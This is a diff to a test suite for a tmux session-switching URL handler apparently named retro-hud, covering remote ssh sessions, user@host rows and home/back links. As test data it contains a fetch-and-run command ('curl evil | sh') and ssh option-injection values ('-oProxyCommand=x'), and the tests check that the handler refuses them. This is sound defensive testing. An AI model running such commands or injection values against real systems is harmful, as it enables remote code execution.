@@ -949,10 +949,11 @@ class TestHandlerActions(ShellHarness):
 
     def test_send_allowed_when_claude_is_the_panes_child(self):
         # a launcher script in front: pane_current_command is bash, claude its child
+        # (a copy of bash: a multicall coreutils `sleep` refuses another name)
         fake = os.path.join(self.tmp, "claude")
-        shutil.copy("/bin/sleep", fake)
+        shutil.copy(shutil.which("bash"), fake)
         os.chmod(fake, 0o755)
-        wrapper = subprocess.Popen(["bash", "-c", '"$0" 30; true', fake])
+        wrapper = subprocess.Popen(["bash", "-c", '"$0" -c "sleep 30; true"; true', fake])
         self.addCleanup(wrapper.kill)
         for _ in range(50):
             if subprocess.run(["pgrep", "-P", str(wrapper.pid), "-x", "claude"],
@@ -1740,7 +1741,7 @@ class TestHandlerSessions(TestHandlerAgent):
         self.run_handler("retro-hud://switch?to=remote:lab:dev_x", FAKE_TMUX_CLIENT_SESSION="work")
         self.assertEqual(self.tmux_calls("has-session"), [["has-session", "-t", "=rh-lab-dev_x"]])
         self.assertEqual(self.tmux_calls("new-session"),
-                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t -- lab tmux attach -t dev_x"]])
+                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t -- lab \"tmux attach -t '=dev_x'\""]])
         self.assertEqual(self.tmux_calls("switch-client"), [["switch-client", "-c", "/dev/pts/3", "-t", "=rh-lab-dev_x"]])
         # a second click: the wrapper is there, just switch
         self.run_handler("retro-hud://switch?to=remote:lab:dev_x", FAKE_TMUX_SESSIONS="rh-lab-dev_x")
@@ -1751,7 +1752,7 @@ class TestHandlerSessions(TestHandlerAgent):
         self.feed("lab", [{"name": "dev.x", "state": "working"}], open_cmd="curl evil | sh; ssh {host}")
         self.run_handler("retro-hud://switch?to=remote:lab:dev.x")
         self.assertEqual(self.tmux_calls("new-session"),
-                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t -- lab tmux attach -t dev.x"]])
+                         [["new-session", "-d", "-s", "rh-lab-dev_x", "ssh -t -- lab \"tmux attach -t '=dev.x'\""]])
         self.run_handler("retro-hud://switch?to=remote:lab:dev.x", RETRO_HUD_REMOTE_OPEN="mosh {host} -- tmux a -t {name}")
         self.assertEqual(self.tmux_calls("new-session")[-1][-1], "mosh lab -- tmux a -t dev.x")
         os.makedirs(os.path.join(self.home, ".config", "retro-hud"), exist_ok=True)
@@ -1763,6 +1764,22 @@ class TestHandlerSessions(TestHandlerAgent):
         for bad in ("remote:-oProxyCommand=x:s1", "remote:lab:-x"):
             self.run_handler("retro-hud://switch?to=" + bad)
         self.assertEqual(len(self.tmux_calls("new-session")), 3)
+
+    def test_a_user_at_host_row_can_be_clicked(self):
+        # the feed's rule allows @ in a host or session name; the menu item's
+        # own link must then pass the handler's URL check
+        self.feed("dev@lab", [{"name": "s1", "state": "working"}])
+        self.run_handler(self.url("sessions"), FAKE_TMUX_PANES="")
+        argv = self.tmux_calls("display-menu")[0]
+        cmd = [a for a in argv if "switch?to=remote:dev@lab:s1" in a]
+        self.assertEqual(len(cmd), 1, argv)
+        url = re.search(r"'(retro-hud://switch[^']*)'", cmd[0]).group(1)
+        self.run_handler(url)
+        self.assertEqual(self.tmux_calls("new-session"),
+                         [["new-session", "-d", "-s", "rh-dev_lab-s1", "ssh -t -- dev@lab \"tmux attach -t '=s1'\""]])
+        self.assertEqual(self.tmux_calls("switch-client"), [["switch-client", "-c", "/dev/pts/3", "-t", "=rh-dev_lab-s1"]])
+        self.run_handler("retro-hud://switch?to=me@work")           # a local session named so
+        self.assertEqual(self.tmux_calls("switch-client")[-1], ["switch-client", "-c", "/dev/pts/3", "-t", "=me@work"])
 
     def test_needs_jumps_to_a_remote_session_when_only_it_needs_you(self):
         self.feed("lab", [{"name": "dev_x", "state": "needs", "since": time.time() - 5}])
@@ -1810,6 +1827,30 @@ class TestHandlerHomeBack(TestHandlerAgent):
         self.run_handler("retro-hud://switch?to=home", FAKE_TMUX_CLIENT_SESSION="home")     # already home: unchanged
         with open(self.home_from()) as f:
             self.assertEqual(f.read(), "work\n")
+
+    def test_home_and_back_from_a_bar_drawn_on_another_machine(self):
+        # inside a remote wrapper session the bar is the other machine's: its
+        # links carry that machine's pane and socket, which is no socket here
+        far = "?pane=%2512&sock=/tmp/tmux-4242/default"
+        self.run_handler("retro-hud://home" + far, FAKE_TMUX_CLIENT_SESSION="rh-lab-dev_x")
+        self.assertEqual(self.tmux_calls("switch-client"), [["switch-client", "-c", "/dev/pts/3", "-t", "=home"]])
+        with open(self.home_from()) as f:
+            self.assertEqual(f.read(), "rh-lab-dev_x\n")
+        self.run_handler("retro-hud://back" + far, FAKE_TMUX_CLIENT_SESSION="home")
+        self.assertEqual(self.tmux_calls("switch-client")[-1], ["switch-client", "-c", "/dev/pts/3", "-t", "=rh-lab-dev_x"])
+        self.assertFalse(os.path.exists(self.home_from()))
+        self.assertFalse([c for c in self.log("tmux") if c[:1] == ["-S"]], "the far socket is never used")
+        self.assertIn("not a socket here", self.handler_log())
+        # the list opens too; a socket that is no plain path is refused as ever,
+        # and so is an action that needs the pane
+        self.run_handler("retro-hud://sessions" + far, FAKE_TMUX_PANES="")
+        self.assertEqual(len(self.tmux_calls("display-menu")), 1)
+        n = len(self.tmux_calls())
+        self.run_handler("retro-hud://home?sock=/tmp/a%20b")
+        self.run_handler("retro-hud://home?sock=relative/sock")
+        self.run_handler("retro-hud://cost" + far)
+        self.run_handler("retro-hud://card" + far)
+        self.assertEqual(len(self.tmux_calls()), n)
 
     def test_home_session_name_is_checked(self):
         self.run_handler("retro-hud://home", RETRO_HUD_HOME_SESSION="a b")
